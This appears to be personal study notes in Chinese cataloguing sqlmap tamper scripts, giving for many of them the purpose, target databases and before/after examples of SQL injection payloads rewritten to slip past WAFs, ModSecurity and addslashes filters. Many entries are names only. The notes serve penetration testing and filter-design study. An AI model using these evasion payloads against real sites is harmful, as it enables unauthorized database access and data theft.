Apostrophemask
先看一下他的作用
功能：对引号进行utf-8格式编码(%EF%BC%87)
平台：All
举例：1 AND '1'='1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871
看下代码

我的注释和理解



appendnullbyte.py
功能：在有效载荷结束位置加载零字节字符编码
平台：Microsoft Access
举例：1 AND 1=1 ==> 1 AND 1=1%00



base64encode.py

between.py

功能：用between替换大于号（>）

平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0

举例：
>>> tamper('1 AND A > B--')
    '1 AND A NOT BETWEEN 0 AND B--'
    >>> tamper('1 AND A = B--')
    '1 AND A BETWEEN B AND B--'
    >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')
    '1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'



binary.py

举例：
>>> tamper('1 UNION ALL SELECT NULL, NULL, NULL')
    '1 UNION ALL SELECT binary NULL, binary NULL, binary NULL'
    >>> tamper('1 AND 2>1')
    '1 AND binary 2>binary 1'
    >>> tamper('CASE WHEN (1=1) THEN 1 ELSE 0x28 END')
    'CASE WHEN (binary 1=binary 1) THEN binary 1 ELSE binary 0x28 END'

bluecoat.py
功能：对SQL语句替换空格字符为(%09)，并替换"="--->"LIKE"
平台：MySQL 5.1, SGOS
举例：
 >>> tamper('SELECT id FROM users WHERE id = 1')
    'SELECT%09id FROM%09users WHERE%09id LIKE 1'

chardoubleencode.py

功能：采用url格式编码2次

平台：All

举例：SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545



charencode.py

功能：采用url格式编码1次

平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

举例：
SELECT FIELD FROM%20TABLE 
==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

charunicodeencode.py

功能：对字符串进行Unicode格式转义编码

平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET

举例：SELECT FIELD%20FROM TABLE 
==> %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045


charunicodeescape.py

对有效的payload使用unicode-escape进行转换，已经编码的不做处理，unicode-escape通常用来进行汉字的解码，使用decode('unicode-escape') 进行解码即可 ，适用于所有的数据库，但是ASP和ASP.NET环境




commalesslimit.py

将payload中的逗号使用offset代替，主要用于过滤逗号并且是3个参数的情况下，例如，"limit 2,1" 替换为 "limit 1 offset 2" ，适用于mysql数据库，

    >>> tamper('LIMIT 2, 3')
    'LIMIT 3 OFFSET 2'


commalessmid.py
功能：将payload中的逗号用 from和for代替，用于过滤了逗号并且是3个参数的情况
平台：MySQL 5.0, 5.5
举例：MID(VERSION(), 1, 1) ==> MID(VERSION() FROM 1 FOR 1)


commentbeforeparentheses.py
匹配（）在（前加上/**/

concat2concatws.py
功能：CONCAT() ==> CONCAT_WS()，用于过滤了CONCAT()函数的情况
平台： MySQL 5.0
举例：CONCAT(1,2) ==> CONCAT_WS(MID(CHAR(0),0,0),1,2)

dunion.py
匹配数字和子母规则后将数字和字母中的空格去掉


equaltorlike.py
直接就是=换成like

escapequotes.py
在’前加上\\ 在“加上\\

greatest.py

功能：> ==> GREATEST

平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

举例：1 AND A > B ==> 1 AND GREATEST(A, B+1)=A

a和b+1比较，取两者中的最大值为a；则a >= b+1，亦即a > b

halfversionedmorekeywords.py
功能：空格 ==> /*!0 （在关键字前添加注释）
平台：MySQL 4.0.18, 5.0.22（Mysql < 5.1）
举例：union ==> /*!0union



hex2char.py
tamper('SELECT 0xdeadbeef')
    'SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))'
    """

htmlencode.py

ifnull2casewhenisnull.py
使用CASE WHEN ISNULL(1) THEN(2) ELSE(1) END 替换 IFNULL(1,2) 适用于mysql数据库

ifnull2ifisnull.py
>>> tamper('IFNULL(1, 2)')
    'IF(ISNULL(1),2,1)'



informationschemacomment.py

least.py
>>> tamper('1 AND A > B')
    '1 AND LEAST(A,B+1)=B+1'


lowercase.py
功能：将 payload 里的大写转为小写

平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from information_schema.tables

luanginx.py

misunion.py


modsecurityversioned.py
功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf
平台：MySQL 5.0
举例：1 AND 2>1--  ==> 1 /*!30874AND 2>1*/--


modsecurityzeroversioned.py
功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似
平台：Mysql
举例：1 and 2>1--+ ==> 1 /!00000and 2>1/--+

multiplespaces.py
 >>> random.seed(0)
    >>> tamper('1 UNION SELECT foobar')
    '1     UNION     SELECT     foobar'


overlongutf8.py
功能： 转换给定的payload当中的所有字符
平台：All
举例：SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1


overlongutf8more.py

percentage.py

功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个(%)

平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0

举例：SELECT FIELD FROM TABLE
 ==> %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

plus2concat.py

randomcase.py
功能：将 payload 随机大小写
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：INSERT ==> InseRt

space2morecomment.py

space2morehash.py
功能：用多个[注释符(#)+一个随机字符串+一个换行符]替换控制符

平台：MySQL >= 5.1.13

举例：union select 1,2--+ ==> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2--+

space2mssqlblank.py
功能：用随机的空白符替换payload中的空格

blanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')

平台：Mssql 2000,2005

举例：SELECT id FROM users ==> SELECT%0Eid%0DFROM%07users

space2mssqlhash.py
功能：用[字符# +一个换行符]替换payload中的空格
平台：MSSQL、MySQL
举例：union select 1,2--+ ==> union%23%0Aselect%23%0A1,2--+




space2mysqlblank.py
>>> tamper('SELECT id FROM users')
    'SELECT%A0id%0CFROM%0Dusers'

space2mysqldash.py

space2plus.py

space2randomblank.py

substring2leftright.py

symboliclogical.py

unionalltounion.py

unmagicquotes.py
功能：用宽字符绕过 GPC addslashes
平台：All
举例：1' and 1=1 ==> 1%bf%27 and 1=1--

uppercase.py


varnish.py

versionedkeywords.py

versionedmorekeywords.py

xforwardedfor.py
